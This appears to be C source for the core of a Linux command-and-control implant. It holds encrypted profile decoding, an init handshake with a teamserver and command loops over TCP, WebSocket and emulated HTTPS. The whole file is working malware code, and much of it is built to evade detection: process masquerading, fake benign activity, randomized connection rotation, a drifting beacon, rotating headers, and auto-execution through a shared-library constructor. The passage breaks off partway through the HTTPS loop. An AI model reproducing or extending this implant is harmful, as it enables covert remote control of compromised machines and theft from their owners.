#include "types.h"
#include "crt.h"
#include "msgpack.h"
#include "crypt.h"
#include "connector.h"
#include "ws_connector.h"
#include "agent_info.h"
#include "commander.h"
#include "jobs.h"
#include "pivot.h"
#include "proxyfire.h"
#include "elf_resolve.h"
#include "opsec.h"
#include "timing.h"
#include "noise.h"
#include "config.h"

#ifdef ARCH_X86_64
#include "syscalls_x64.h"
#endif
#ifdef ARCH_AARCH64
#include "syscalls_aarch64.h"
#endif

/// Global state
static int ACTIVE = 1;

/// Stored argv for process masquerading (set by entry point)
char **g_argv = NULL;

static int is_b64_char(uint8_t c) {
    return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
           (c >= '0' && c <= '9') || c == '+' || c == '/' || c == '=';
}

static int is_b64_data_char(uint8_t c) {
    return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
           (c >= '0' && c <= '9') || c == '+' || c == '/';
}

static int looks_like_b64_payload(const uint8_t* data, size_t len) {
    if (!data || len < 40 || (len % 4) != 0) return 0;
    size_t pad = 0;
    for (size_t i = 0; i < len; i++) {
        if (!is_b64_char(data[i])) return 0;
        if (data[i] == '=') {
            pad++;
            if (pad > 2) return 0;
        } else if (pad > 0) {
            return 0;
        }
    }
    return 1;
}

static int find_json_b64_field(const uint8_t* data, size_t len, const char* key,
                               uint8_t** out_start, size_t* out_len) {
    size_t key_len = ax_strlen(key);
    if (!data || !key || key_len == 0 || len <= key_len) return 0;

    for (size_t i = 0; i + key_len < len; i++) {
        if (ax_memcmp(data + i, key, key_len) != 0) continue;
        size_t j = i + key_len;
        while (j < len && (data[j] == ' ' || data[j] == '\t' || data[j] == '\r' || data[j] == '\n')) j++;
        if (j >= len || data[j] != ':') continue;
        j++;
        while (j < len && (data[j] == ' ' || data[j] == '\t' || data[j] == '\r' || data[j] == '\n')) j++;
        if (j >= len || data[j] != '"') continue;
        j++;
        size_t start = j;
        while (j < len && data[j] != '"') j++;
        if (j == start) {
            *out_start = (uint8_t*)0;
            *out_len = 0;
            return 1;
        }
        if (looks_like_b64_payload(data + start, j - start)) {
            *out_start = (uint8_t*)(data + start);
            *out_len = j - start;
            return 1;
        }
    }
    return 0;
}

static void extract_b64_payload(uint8_t* recv_data, size_t recv_len, int ans_pre_size, int ans_size,
                                uint8_t** b64_start, size_t* b64_len) {
    *b64_start = recv_data;
    *b64_len = recv_len;

    if (!recv_data || recv_len == 0) return;

    // Exact/legacy profile offsets still win when configured.
    if (ans_pre_size > 0 && (int)recv_len > ans_pre_size + ans_size) {
        *b64_start = recv_data + ans_pre_size;
        *b64_len = recv_len - ans_pre_size - ans_size;
        if (looks_like_b64_payload(*b64_start, *b64_len)) return;
    }

    // Business JSON wrappers: {"payload":"..."}, {"data":"..."}, etc.
    if (find_json_b64_field(recv_data, recv_len, "\"payload\"", b64_start, b64_len)) return;
    if (find_json_b64_field(recv_data, recv_len, "\"data\"", b64_start, b64_len)) return;
    if (find_json_b64_field(recv_data, recv_len, "\"body\"", b64_start, b64_len)) return;
    if (find_json_b64_field(recv_data, recv_len, "\"message\"", b64_start, b64_len)) return;

    // Fallback: longest base64-looking run inside Socket.IO/custom text frames.
    size_t best_start = 0, best_len = 0;
    size_t i = 0;
    while (i < recv_len) {
        while (i < recv_len && !is_b64_data_char(recv_data[i])) i++;
        size_t start = i;
        while (i < recv_len && is_b64_char(recv_data[i])) i++;
        size_t run_len = i - start;
        while (run_len > 0 && (run_len % 4) != 0) run_len--;
        if (run_len > best_len && looks_like_b64_payload(recv_data + start, run_len)) {
            best_start = start;
            best_len = run_len;
        }
    }
    if (best_len > 0) {
        *b64_start = recv_data + best_start;
        *b64_len = best_len;
    }
}

/// Decode an encrypted profile blob
/// Input: [key 16B][AES-128-GCM encrypted msgpack(Profile)]
typedef struct {
    uint32_t  type;
    uint32_t  listener_watermark;
    char**    addresses;
    uint32_t  addr_count;
    int       banner_size;
    int       conn_timeout;
    int       conn_count;
    int       use_ssl;
    uint8_t   enc_key[16];
    uint16_t  bind_port;
    // WebSocket-specific fields
    char**    uris;
    uint32_t  uri_count;
    char**    ua_list;
    uint32_t  ua_count;
    int       ans_size;
    int       ans_pre_size;
    // HTTPS-emulation fields (H1 Phase 1b)
    int       is_https_emu;
    char      heartbeat_header[48];
} profile_t;

static int decode_profile(const uint8_t* enc_data, uint32_t enc_size, profile_t* prof) {
    if (enc_size < 16 + GCM_NONCE_SIZE + GCM_TAG_SIZE) return -1;

    // Extract key (first 16 bytes)
    ax_memcpy(prof->enc_key, enc_data, 16);

    // Decrypt the rest
    size_t pt_len;
    uint8_t* plaintext = aes128_gcm_decrypt(enc_data + 16, enc_size - 16, prof->enc_key, &pt_len);
    if (!plaintext) return -1;

    // Parse msgpack Profile struct
    mp_reader_t r;
    mp_reader_init(&r, plaintext, pt_len);

    uint32_t map_count;
    if (mp_read_map(&r, &map_count) != 0) {
        ax_free(plaintext);
        return -1;
    }

    // Initialize defaults
    prof->type = 0;
    prof->listener_watermark = 0;
    prof->addresses = (char**)0;
    prof->addr_count = 0;
    prof->banner_size = 0;
    prof->conn_timeout = 10;
    prof->conn_count = 1000000000;
    prof->use_ssl = 0;
    prof->bind_port = 0;
    prof->uris = (char**)0;
    prof->uri_count = 0;
    prof->ua_list = (char**)0;
    prof->ua_count = 0;
    prof->ans_size = 0;
    prof->ans_pre_size = 0;
    prof->is_https_emu = 0;
    ax_strcpy(prof->heartbeat_header, "X-Requested-With");

    for (uint32_t i = 0; i < map_count; i++) {
        const char* key;
        uint32_t klen;
        if (mp_read_str(&r, &key, &klen) != 0) break;

        if (klen == 4 && ax_memcmp(key, "type", 4) == 0) {
            uint64_t v; mp_read_uint(&r, &v); prof->type = (uint32_t)v;
        } else if (klen == 18 && ax_memcmp(key, "listener_watermark", 18) == 0) {
            uint64_t v; mp_read_uint(&r, &v); prof->listener_watermark = (uint32_t)v;
        } else if (klen == 9 && ax_memcmp(key, "addresses", 9) == 0) {
            uint32_t arr_count;
            if (mp_read_array(&r, &arr_count) == 0) {
                prof->addresses = (char**)ax_malloc(arr_count * sizeof(char*));
                prof->addr_count = arr_count;
                for (uint32_t j = 0; j < arr_count; j++) {
                    const char* addr; uint32_t alen;
                    mp_read_str(&r, &addr, &alen);
                    prof->addresses[j] = (char*)ax_malloc(alen + 1);
                    ax_memcpy(prof->addresses[j], addr, alen);
                    prof->addresses[j][alen] = '\0';
                }
            }
        } else if (klen == 11 && ax_memcmp(key, "banner_size", 11) == 0) {
            uint64_t v; mp_read_uint(&r, &v); prof->banner_size = (int)v;
        } else if (klen == 12 && ax_memcmp(key, "conn_timeout", 12) == 0) {
            uint64_t v; mp_read_uint(&r, &v); prof->conn_timeout = (int)v;
        } else if (klen == 10 && ax_memcmp(key, "conn_count", 10) == 0) {
            uint64_t v; mp_read_uint(&r, &v); prof->conn_count = (int)v;
        } else if (klen == 7 && ax_memcmp(key, "use_ssl", 7) == 0) {
            bool v; mp_read_bool(&r, &v); prof->use_ssl = v ? 1 : 0;
        } else if (klen == 9 && ax_memcmp(key, "bind_port", 9) == 0) {
            uint64_t v; mp_read_uint(&r, &v); prof->bind_port = (uint16_t)v;
        } else if (klen == 4 && ax_memcmp(key, "uris", 4) == 0) {
            uint32_t arr_count;
            if (mp_read_array(&r, &arr_count) == 0) {
                prof->uris = (char**)ax_malloc(arr_count * sizeof(char*));
                prof->uri_count = arr_count;
                for (uint32_t j = 0; j < arr_count; j++) {
                    const char* u; uint32_t ulen;
                    mp_read_str(&r, &u, &ulen);
                    prof->uris[j] = (char*)ax_malloc(ulen + 1);
                    ax_memcpy(prof->uris[j], u, ulen);
                    prof->uris[j][ulen] = '\0';
                }
            }
        } else if (klen == 7 && ax_memcmp(key, "ua_list", 7) == 0) {
            uint32_t arr_count;
            if (mp_read_array(&r, &arr_count) == 0) {
                prof->ua_list = (char**)ax_malloc(arr_count * sizeof(char*));
                prof->ua_count = arr_count;
                for (uint32_t j = 0; j < arr_count; j++) {
                    const char* ua; uint32_t ualen;
                    mp_read_str(&r, &ua, &ualen);
                    prof->ua_list[j] = (char*)ax_malloc(ualen + 1);
                    ax_memcpy(prof->ua_list[j], ua, ualen);
                    prof->ua_list[j][ualen] = '\0';
                }
            }
        } else if (klen == 8 && ax_memcmp(key, "ans_size", 8) == 0) {
            uint64_t v; mp_read_uint(&r, &v); prof->ans_size = (int)v;
        } else if (klen == 11 && ax_memcmp(key, "ans_pre_size", 11) == 0) {
            uint64_t v; mp_read_uint(&r, &v); prof->ans_pre_size = (int)v;
        } else if (klen == 12 && ax_memcmp(key, "is_https_emu", 12) == 0) {
            bool v; mp_read_bool(&r, &v); prof->is_https_emu = v ? 1 : 0;
        } else if (klen == 16 && ax_memcmp(key, "heartbeat_header", 16) == 0) {
            const char* hv; uint32_t hlen;
            if (mp_read_str(&r, &hv, &hlen) == 0 && hlen > 0 && hlen < 48) {
                ax_memcpy(prof->heartbeat_header, hv, hlen);
                prof->heartbeat_header[hlen] = '\0';
            }
        } else {
            mp_skip(&r);
        }
    }

    ax_free(plaintext);
    return 0;
}

static void free_profile(profile_t* prof) {
    if (prof->addresses) {
        for (uint32_t i = 0; i < prof->addr_count; i++) {
            if (prof->addresses[i])
                ax_free(prof->addresses[i]);
        }
        ax_free(prof->addresses);
    }
    if (prof->uris) {
        for (uint32_t i = 0; i < prof->uri_count; i++) {
            if (prof->uris[i])
                ax_free(prof->uris[i]);
        }
        ax_free(prof->uris);
    }
    if (prof->ua_list) {
        for (uint32_t i = 0; i < prof->ua_count; i++) {
            if (prof->ua_list[i])
                ax_free(prof->ua_list[i]);
        }
        ax_free(prof->ua_list);
    }
}

/// Build the init message: [4B listener_watermark BE][encrypted(StartMsg{type:INIT_PACK, data:InitPack{id, type, data:sessionInfo}})]
/// The 4B watermark prefix enables pivot routing — parent extracts it and sends to teamserver
/// Encrypted portion uses profile key (AES-128-GCM)
static int build_init_msg(uint32_t agent_id, uint32_t profile_type,
                          uint32_t listener_watermark,
                          const uint8_t* session_info, size_t si_len,
                          const uint8_t* enc_key,
                          uint8_t** out_msg, size_t* out_len) {
    // Inner: InitPack — declaration order: Id, Type, Data → tags: id, type, data
    mp_writer_t inner;
    mp_writer_init(&inner, 256);
    mp_write_map(&inner, 3);
    mp_write_kv_uint(&inner, "id", agent_id);
    mp_write_kv_uint(&inner, "type", profile_type);
    mp_write_kv_bin(&inner, "data", session_info, (uint32_t)si_len);

    // Outer: StartMsg — declaration order: Type, Data → tags: id, data
    mp_writer_t outer;
    mp_writer_init(&outer, 256);
    mp_write_map(&outer, 2);
    mp_write_kv_int(&outer, "id", INIT_PACK);
    mp_write_kv_bin(&outer, "data", inner.buf.data, (uint32_t)inner.buf.len);

    mp_writer_free(&inner);

    // Encrypt with profile key
    size_t enc_len;
    uint8_t* encrypted = aes128_gcm_encrypt(outer.buf.data, outer.buf.len, enc_key, &enc_len);
    mp_writer_free(&outer);

    if (!encrypted) return -1;

    // Prepend 4-byte listener watermark (big-endian) for pivot routing
    size_t total_len = 4 + enc_len;
    uint8_t* msg = (uint8_t*)ax_malloc(total_len);
    if (!msg) { ax_free(encrypted); return -1; }

    msg[0] = (uint8_t)(listener_watermark >> 24);
    msg[1] = (uint8_t)(listener_watermark >> 16);
    msg[2] = (uint8_t)(listener_watermark >> 8);
    msg[3] = (uint8_t)(listener_watermark);
    ax_memcpy(msg + 4, encrypted, enc_len);
    ax_free(encrypted);

    *out_msg = msg;
    *out_len = total_len;
    return 0;
}

/// Build init message for GopherTCP: gopher_encrypt with profile key, no watermark prefix
static int build_init_msg_gopher(uint32_t agent_id, uint32_t profile_type,
                                 const uint8_t* session_info, size_t si_len,
                                 const uint8_t* enc_key,
                                 uint8_t** out_msg, size_t* out_len) {
    // Inner: InitPack
    mp_writer_t inner;
    mp_writer_init(&inner, 256);
    mp_write_map(&inner, 3);
    mp_write_kv_uint(&inner, "id", agent_id);
    mp_write_kv_uint(&inner, "type", profile_type);
    mp_write_kv_bin(&inner, "data", session_info, (uint32_t)si_len);

    // Outer: StartMsg
    mp_writer_t outer;
    mp_writer_init(&outer, 256);
    mp_write_map(&outer, 2);
    mp_write_kv_int(&outer, "id", INIT_PACK);
    mp_write_kv_bin(&outer, "data", inner.buf.data, (uint32_t)inner.buf.len);

    mp_writer_free(&inner);

    // Encrypt with Gopher protocol (AES-GCM + double-RC4 overlay)
    size_t enc_len;
    uint8_t* encrypted = gopher_encrypt(outer.buf.data, outer.buf.len, enc_key, 16, &enc_len);
    mp_writer_free(&outer);

    if (!encrypted) return -1;

    *out_msg = encrypted;
    *out_len = enc_len;
    return 0;
}

/// Parse Message{type: int8, object: [][]byte} from decrypted data
static int parse_message(const uint8_t* data, size_t len,
                         int8_t* msg_type,
                         const uint8_t*** objects, uint32_t** obj_sizes,
                         uint32_t* obj_count) {
    mp_reader_t r;
    mp_reader_init(&r, data, len);

    uint32_t map_count;
    if (mp_read_map(&r, &map_count) != 0) return -1;

    *msg_type = 0;
    *objects = (const uint8_t**)0;
    *obj_sizes = (uint32_t*)0;
    *obj_count = 0;

    for (uint32_t i = 0; i < map_count; i++) {
        const char* key;
        uint32_t klen;
        if (mp_read_str(&r, &key, &klen) != 0) return -1;

        if (klen == 6 && ax_memcmp(key, "object", 6) == 0) {
            uint32_t arr_count;
            if (mp_read_array(&r, &arr_count) != 0) return -1;

            *objects = (const uint8_t**)ax_malloc(arr_count * sizeof(uint8_t*));
            *obj_sizes = (uint32_t*)ax_malloc(arr_count * sizeof(uint32_t));
            *obj_count = arr_count;

            for (uint32_t j = 0; j < arr_count; j++) {
                const uint8_t* bin_data;
                uint32_t bin_len;
                if (mp_read_bin(&r, &bin_data, &bin_len) != 0) return -1;
                (*objects)[j] = bin_data;
                (*obj_sizes)[j] = bin_len;
            }
        } else if (klen == 4 && ax_memcmp(key, "type", 4) == 0) {
            int64_t v;
            if (mp_read_int(&r, &v) != 0) return -1;
            *msg_type = (int8_t)v;
        } else {
            mp_skip(&r);
        }
    }
    return 0;
}

/// Parse a single Command from msgpack: {code: uint, id: uint, data: []byte}
static int parse_command(const uint8_t* data, size_t len,
                         uint32_t* code, uint32_t* cmd_id,
                         const uint8_t** cmd_data, uint32_t* cmd_data_len) {
    mp_reader_t r;
    mp_reader_init(&r, data, len);

    uint32_t map_count;
    if (mp_read_map(&r, &map_count) != 0) return -1;

    *code = 0; *cmd_id = 0; *cmd_data = (uint8_t*)0; *cmd_data_len = 0;

    for (uint32_t i = 0; i < map_count; i++) {
        const char* key;
        uint32_t klen;
        if (mp_read_str(&r, &key, &klen) != 0) return -1;

        if (klen == 4 && ax_memcmp(key, "code", 4) == 0) {
            uint64_t v; mp_read_uint(&r, &v); *code = (uint32_t)v;
        } else if (klen == 2 && ax_memcmp(key, "id", 2) == 0) {
            uint64_t v; mp_read_uint(&r, &v); *cmd_id = (uint32_t)v;
        } else if (klen == 4 && ax_memcmp(key, "data", 4) == 0) {
            mp_read_bin(&r, cmd_data, cmd_data_len);
        } else {
            mp_skip(&r);
        }
    }
    return 0;
}

/// ---- Entry points ----

static int agent_main(void);

#ifdef BUILD_SO
// Linux passes argc, argv, envp to constructors (GCC extension)
__attribute__((constructor))
static void so_entry(int argc, char **argv, char **envp) {
    (void)argc; (void)envp;
    g_argv = argv;
    agent_main();
}
#else
// Static ELF: _start receives the stack directly from the kernel.
// On Linux x86_64/ARM64, stack layout at _start:
//   [rsp/sp] = argc
//   [rsp+8]  = argv[0]
//   [rsp+16] = argv[1]
//   ...
//
// CRITICAL: _start MUST be naked. Without naked, gcc generates a
// function prologue (push rbp; mov rbp,rsp) that shifts RSP before
// we can read it, corrupting g_argv → segfault in masquerade/migrate.

// Helper called from the naked ASM trampoline with the original SP value.
__attribute__((noreturn, noinline, used))
static void _start_c(unsigned long *stack) {
    // Zero-libc static binaries do NOT inherit SIGPIPE-ignored state
    // (no CRT); a write to a dead C2 socket would SIGPIPE-kill the
    // agent instead of failing the syscall. Ignore it up front so
    // connection loss always flows through the retry loop.
    {
        struct { unsigned long handler, flags, restorer, mask; } sa;
        ax_memset(&sa, 0, sizeof(sa));
        sa.handler = 1UL;  // SIG_IGN
        sys_rt_sigaction(13 /* SIGPIPE */, &sa, (void*)0, 8);
    }
    g_argv = (char **)(stack + 1);  // argv starts after argc
    int ret = agent_main();
    sys_exit_group(ret);
    __builtin_unreachable();
}

__attribute__((naked, noreturn))
void _start(void) {
#ifdef ARCH_X86_64
    __asm__ volatile (
        "mov   %%rsp, %%rdi\n"   // rdi = original SP (argc at [rsp])
        "and   $-16, %%rsp\n"    // 16-byte align stack (ABI)
        "call  _start_c\n"
        ::: "memory"
    );
#elif defined(ARCH_AARCH64)
    __asm__ volatile (
        "mov   x0, sp\n"         // x0 = original SP (argc at [sp])
        "and   sp, x0, #-16\n"   // 16-byte align stack (ABI)
        "bl    _start_c\n"
        ::: "memory"
    );
#endif
}
#endif

/// Command loop — shared between client TCP and bind TCP modes.
/// Handles recv/process/send cycle with non-blocking polling.
/// Returns 0 if ACTIVE was set to 0 (exit), -1 on connection error.
static int command_loop(connector_t* conn, const uint8_t* session_key, size_t session_key_len, uint64_t rotate_ms) {
    uint64_t conn_start = ax_monotonic_ms();
    uint64_t last_beacon_ms = 0;
    while (ACTIVE) {
        // Connection rotation: drop a healthy link after a randomized
        // lifetime so traffic shows sparse irregular churn (not one
        // eternal idle channel). Signal -2 to the outer reconnect loop.
        if (rotate_ms && ax_monotonic_ms() - conn_start >= rotate_ms)
            return -2;

        // Benign-behavior noise (self-gating, randomized cadence)
        ax_behavior_noise();

        uint8_t* recv_data = (uint8_t*)0;
        size_t recv_len = 0;

        // Poll C2 socket with 100ms timeout
        int poll_ret = conn_recv_msg_timeout(conn, &recv_data, &recv_len, 100);
        if (poll_ret < 0) return -1;  // error/disconnect → reconnect
        // NOTE: poll_ret == 0 for BOTH timeout and received messages.
        // A real message is the only case where recv_data is non-NULL.
        int got_msg = (recv_data != (uint8_t*)0);

        // Build response objects collector
        mp_writer_t obj_collector;
        mp_writer_init(&obj_collector, 1024);
        uint32_t resp_count = 0;

        // If we received data from teamserver, process it
        uint8_t* plaintext = (uint8_t*)0;
        const uint8_t** objects = (const uint8_t**)0;
        uint32_t* obj_sizes = (uint32_t*)0;
        uint32_t obj_count = 0;

        if (poll_ret == 0 && recv_data && recv_len > 0) {
            // Decrypt with session key (GopherTCP: 32-byte key, LinuxTCP: 16-byte key)
            size_t plain_len;
            if (session_key_len >= 32)
                plaintext = gopher_decrypt_nogcm(recv_data, recv_len, session_key, session_key_len, &plain_len);
            else
                plaintext = aes128_gcm_decrypt(recv_data, recv_len, session_key, &plain_len);
            ax_free(recv_data);
            recv_data = (uint8_t*)0;
            if (!plaintext) return -1;

            // Parse Message
            int8_t msg_type = 0;

            if (parse_message(plaintext, plain_len, &msg_type, &objects, &obj_sizes, &obj_count) != 0) {
                ax_free(plaintext);
                return -1;
            }

            if (msg_type == 1 && obj_count > 0) {
                for (uint32_t i = 0; i < obj_count; i++) {
                    uint32_t code = 0, cmd_id = 0;
                    const uint8_t* cmd_data = (const uint8_t*)0;
                    uint32_t cmd_data_len = 0;
                    parse_command(objects[i], obj_sizes[i],
                                 &code, &cmd_id, &cmd_data, &cmd_data_len);

                    mp_writer_t cmd_resp;
                    mp_writer_init(&cmd_resp, 256);

                    int ret = handle_command(code, cmd_id, cmd_data, cmd_data_len, &cmd_resp);
                    if (ret == -99) ACTIVE = 0;

                    // Wrap response in Command{code, id, data}
                    mp_writer_t wrapped;
                    mp_writer_init(&wrapped, 256);
                    mp_write_map(&wrapped, 3);
                    mp_write_kv_uint(&wrapped, "code", code);
                    mp_write_kv_uint(&wrapped, "id", cmd_id);
                    mp_write_kv_bin(&wrapped, "data", cmd_resp.buf.data, (uint32_t)cmd_resp.buf.len);

                    mp_write_bin(&obj_collector, wrapped.buf.data, (uint32_t)wrapped.buf.len);
                    mp_writer_free(&cmd_resp);
                    mp_writer_free(&wrapped);
                    resp_count++;
                }
            }
        } else if (poll_ret == 0 && recv_len == 0) {
            // Received empty heartbeat from teamserver (len=0 msg)
            ax_free(recv_data);
            recv_data = (uint8_t*)0;
        }
        // poll_ret == 1: timeout, no data from teamserver

        // ALWAYS poll active pivots and tunnels
        resp_count += (uint32_t)process_pivots(&g_pivot_ctx, &obj_collector);
        resp_count += (uint32_t)process_tunnels(&obj_collector);

        // Respond on real server messages, or on the slow idle beacon
        // (20-45 s drifted) — never on every poll timeout. The old
        // per-timeout response flooded the socket and broke sessions.
        int beacon_due = ax_beacon_due(ax_monotonic_ms(), &last_beacon_ms);
        int must_respond = got_msg || beacon_due;
        if (resp_count > 0 || must_respond) {
            mp_writer_t msg_writer;
            mp_writer_init(&msg_writer, 1024);
            mp_write_map(&msg_writer, 2);

            if (resp_count > 0) {
                mp_write_kv_int(&msg_writer, "type", 1);
                mp_write_str(&msg_writer, "object", 6);
                mp_write_array(&msg_writer, resp_count);
                buf_append(&msg_writer.buf, obj_collector.buf.data, obj_collector.buf.len);
            } else {
                mp_write_kv_int(&msg_writer, "type", 0);
                mp_write_str(&msg_writer, "object", 6);
                mp_write_array(&msg_writer, 0);
            }

            size_t enc_len;
            uint8_t* encrypted;
            if (session_key_len >= 32)
                encrypted = gopher_encrypt_nogcm(msg_writer.buf.data, msg_writer.buf.len,
                                           session_key, session_key_len, &enc_len);
            else
                encrypted = aes128_gcm_encrypt(msg_writer.buf.data, msg_writer.buf.len,
                                                session_key, &enc_len);
            mp_writer_free(&msg_writer);

            if (encrypted) {
                if (conn_send_msg(conn, encrypted, enc_len) != 0) {
                    ax_free(encrypted);
                    mp_writer_free(&obj_collector);
                    if (objects) ax_free((void*)objects);
                    if (obj_sizes) ax_free(obj_sizes);
                    if (plaintext) ax_free(plaintext);
                    return -1;
                }
                ax_free(encrypted);
            }
        }
        mp_writer_free(&obj_collector);

        // Cleanup
        if (objects) ax_free((void*)objects);
        if (obj_sizes) ax_free(obj_sizes);
        if (plaintext) ax_free(plaintext);
        if (recv_data) ax_free(recv_data);
    }
    return 0;
}

/// WebSocket command loop — send/receive via WS frames
/// Uses ans_pre_size/ans_size from profile to strip WebPageOutput template.
/// Returns 0 if ACTIVE was set to 0 (exit), -1 on connection error,
/// -2 when connection rotation was requested.
static int ws_command_loop(ws_connector_t* ws, const uint8_t* session_key, size_t session_key_len,
                           int ans_pre_size, int ans_size, uint64_t rotate_ms) {
    uint64_t conn_start = ax_monotonic_ms();
    uint64_t last_beacon_ms = 0;
    while (ACTIVE) {
        // Connection rotation (same rationale as command_loop)
        if (rotate_ms && ax_monotonic_ms() - conn_start >= rotate_ms)
            return -2;

        // Benign-behavior noise (self-gating, randomized cadence)
        ax_behavior_noise();

        uint8_t* recv_data = (uint8_t*)0;
        size_t recv_len = 0;

        // Poll WS with 100ms timeout
        int poll_ret = ws_recv_message_timeout(ws, &recv_data, &recv_len, 100);
        if (poll_ret < 0) return -1;  // error/disconnected → reconnect
        // poll_ret == 0 for both timeout and received messages; only a
        // real message leaves recv_data non-NULL.
        int got_msg = (recv_data != (uint8_t*)0);

        // Build response objects collector
        mp_writer_t obj_collector;
        mp_writer_init(&obj_collector, 1024);
        uint32_t resp_count = 0;

        uint8_t* plaintext = (uint8_t*)0;
        const uint8_t** objects = (const uint8_t**)0;
        uint32_t* obj_sizes = (uint32_t*)0;
        uint32_t obj_count = 0;
        int8_t ws_msg_type = 0;

        if (poll_ret == 0 && recv_data && recv_len > 0) {
            // Extract base64 payload from plain, fixed-template, JSON, or Socket.IO wrappers.
            uint8_t* b64_start = recv_data;
            size_t b64_len = recv_len;
            extract_b64_payload(recv_data, recv_len, ans_pre_size, ans_size, &b64_start, &b64_len);

            // Base64-decode the payload to get raw encrypted bytes
            if (b64_len > 0) {
                // Calculate max decoded size
                size_t dec_max = (b64_len * 3) / 4 + 1;
                uint8_t* decoded = (uint8_t*)ax_malloc(dec_max);
                if (decoded) {
                    int dec_len = ws_b64_decode((const char*)b64_start, b64_len, decoded, dec_max);
                    if (dec_len > 0) {
                        // Now try to decrypt the decoded binary data
                        size_t plain_len;
                        uint8_t* possible_plain = (uint8_t*)0;

                        if (session_key_len >= 32)
                            possible_plain = gopher_decrypt_nogcm(decoded, (size_t)dec_len,
                                                             session_key, session_key_len, &plain_len);
                        else
                            possible_plain = aes128_gcm_decrypt(decoded, (size_t)dec_len,
                                                                session_key, &plain_len);

                        if (possible_plain) {
                            plaintext = possible_plain;
                            // Parse Message
                            if (parse_message(plaintext, plain_len, &ws_msg_type, &objects, &obj_sizes, &obj_count) != 0) {
                                ax_free(plaintext);
                                plaintext = (uint8_t*)0;
                            }
                        }
                    }
                    ax_free(decoded);
                }
            }

            ax_free(recv_data);
            recv_data = (uint8_t*)0;

            if (ws_msg_type == 1 && obj_count > 0) {
                for (uint32_t i = 0; i < obj_count; i++) {
                    uint32_t code = 0, cmd_id = 0;
                    const uint8_t* cmd_data = (const uint8_t*)0;
                    uint32_t cmd_data_len = 0;
                    parse_command(objects[i], obj_sizes[i],
                                 &code, &cmd_id, &cmd_data, &cmd_data_len);

                    mp_writer_t cmd_resp;
                    mp_writer_init(&cmd_resp, 256);

                    int ret = handle_command(code, cmd_id, cmd_data, cmd_data_len, &cmd_resp);
                    if (ret == -99) ACTIVE = 0;

                    // Wrap response in Command{code, id, data}
                    mp_writer_t wrapped;
                    mp_writer_init(&wrapped, 256);
                    mp_write_map(&wrapped, 3);
                    mp_write_kv_uint(&wrapped, "code", code);
                    mp_write_kv_uint(&wrapped, "id", cmd_id);
                    mp_write_kv_bin(&wrapped, "data", cmd_resp.buf.data, (uint32_t)cmd_resp.buf.len);

                    mp_write_bin(&obj_collector, wrapped.buf.data, (uint32_t)wrapped.buf.len);
                    mp_writer_free(&cmd_resp);
                    mp_writer_free(&wrapped);
                    resp_count++;
                }
            }
        } else if (poll_ret == 0 && recv_len == 0) {
            // Received empty heartbeat from teamserver
            if (recv_data) ax_free(recv_data);
            recv_data = (uint8_t*)0;
        }

        // ALWAYS poll active pivots and tunnels
        resp_count += (uint32_t)process_pivots(&g_pivot_ctx, &obj_collector);
        resp_count += (uint32_t)process_tunnels(&obj_collector);

        // Respond on real server messages, or on the slow idle beacon
        // (20-45 s drifted) — never on every poll timeout.
        int beacon_due = ax_beacon_due(ax_monotonic_ms(), &last_beacon_ms);
        int must_respond = got_msg || beacon_due;
        if (resp_count > 0 || must_respond) {
            mp_writer_t msg_writer;
            mp_writer_init(&msg_writer, 1024);
            mp_write_map(&msg_writer, 2);

            if (resp_count > 0) {
                mp_write_kv_int(&msg_writer, "type", 1);
                mp_write_str(&msg_writer, "object", 6);
                mp_write_array(&msg_writer, resp_count);
                buf_append(&msg_writer.buf, obj_collector.buf.data, obj_collector.buf.len);
            } else {
                mp_write_kv_int(&msg_writer, "type", 0);
                mp_write_str(&msg_writer, "object", 6);
                mp_write_array(&msg_writer, 0);
            }

            size_t enc_len;
            uint8_t* encrypted;
            if (session_key_len >= 32)
                encrypted = gopher_encrypt_nogcm(msg_writer.buf.data, msg_writer.buf.len,
                                           session_key, session_key_len, &enc_len);
            else
                encrypted = aes128_gcm_encrypt(msg_writer.buf.data, msg_writer.buf.len,
                                                session_key, &enc_len);
            mp_writer_free(&msg_writer);

            if (encrypted) {
                // Send encrypted data as WebSocket text frame
                if (ws_send_text(ws, encrypted, enc_len) != 0) {
                    ax_free(encrypted);
                    mp_writer_free(&obj_collector);
                    if (objects) ax_free((void*)objects);
                    if (obj_sizes) ax_free(obj_sizes);
                    if (plaintext) ax_free(plaintext);
                    return -1;
                }
                ax_free(encrypted);
            }
        }
        mp_writer_free(&obj_collector);

        // Cleanup
        if (objects) ax_free((void*)objects);
        if (obj_sizes) ax_free(obj_sizes);
        if (plaintext) ax_free(plaintext);
        if (recv_data) ax_free(recv_data);
    }
    return 0;
}

static int https_command_loop(ws_connector_t* ws, const uint8_t* session_key, size_t session_key_len,
                              int ans_pre_size, int ans_size, uint64_t rotate_ms,
                              profile_t* prof, uint32_t agent_id,
                              const uint8_t* session_info_data, size_t session_info_len,
                              const char* current_uri, const char* current_ua) {
    uint64_t conn_start = ax_monotonic_ms();
    uint64_t last_beacon_ms = 0;

    // The beat rides in the browser header on EVERY request (stateless HTTP);
    // the header NAME rotates across the comma-list per request (Phase 1b).
    uint8_t beat_buf[512];
    size_t beat_len = 0;
    if (ws_build_beat(prof->enc_key, prof->type, agent_id,
                      session_info_data, session_info_len,
                      beat_buf, sizeof(beat_buf), &beat_len) != 0) return -1;
    beat_buf[beat_len] = '\0';
    uint32_t hb_idx = 0;

    // Response collector persists ACROSS iterations: command responses are
    // appended AFTER this iteration's POST already went out (stateless HTTP
    // is request-first), so they must ride the NEXT iteration's POST. The
    // old per-iteration collector freed them unsent - task responses were
    // silently dropped and the server never saw command output.
    mp_writer_t obj_collector;
    mp_writer_init(&obj_collector, 1024);
    uint32_t resp_count = 0;

    while (ACTIVE) {
        if (rotate_ms && ax_monotonic_ms() - conn_start >= rotate_ms) {
            mp_writer_free(&obj_collector);
            return -2;
        }

        // Benign-behavior noise (self-gating, randomized cadence)
        ax_behavior_noise();

        // Poll active pivots and tunnels into the persistent collector
        resp_count += (uint32_t)process_pivots(&g_pivot_ctx, &obj_collector);
        resp_count += (uint32_t)process_tunnels(&obj_collector);

        // Idle beacon on the drifted 20-45s cadence; results POST immediately
        int beacon_due = ax_beacon_due(ax_monotonic_ms(), &last_beacon_ms);

        uint8_t* recv_data = (uint8_t*)0;
        size_t recv_len = 0;
        uint8_t* plaintext = (uint8_t*)0;
        const uint8_t** objects = (const uint8_t**)0;
        uint32_t* obj_sizes = (uint32_t*)0;
        uint32_t obj_count = 0;
        int8_t msg_type = 0;

